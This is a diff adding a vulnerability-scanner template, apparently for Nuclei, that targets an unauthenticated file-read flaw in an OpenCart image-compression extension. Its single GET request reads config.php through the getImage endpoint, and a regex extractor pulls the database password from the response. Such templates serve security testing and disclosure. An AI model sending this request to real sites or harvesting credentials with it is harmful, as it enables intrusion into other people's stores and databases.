@@ -1,0 +1,48 @@
+id: opencart-image-compress-squeezeimg-lfi
+
+info:
+  name: OpenCart Image Compress Squeezeimg - Unauthenticated LFI (config.php read)
+  author: research
+  severity: critical
+  description: |
+    The Image Compress with Squeezeimg extension (marketplace ID 40868) exposes
+    a getImage() endpoint that serves arbitrary files from the web root via
+    file_get_contents() without path sanitization. Allows unauthenticated reading
+    of config.php (DB credentials), admin/config.php, and any other file in the
+    OpenCart web root.
+  tags: opencart,lfi,disclosure,unauth,rce
+  metadata:
+    opencart-extension-id: "40868"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?route=extension/module/images_compress_squeezeimg/getImage&url=config.php"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "DB_PASSWORD"
+          - "DB_HOSTNAME"
+          - "DB_USERNAME"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "define("
+          - "DIR_APPLICATION"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        name: db_password
+        regex:
+          - "define\\('DB_PASSWORD',\\s*'([^']+)'\\)"
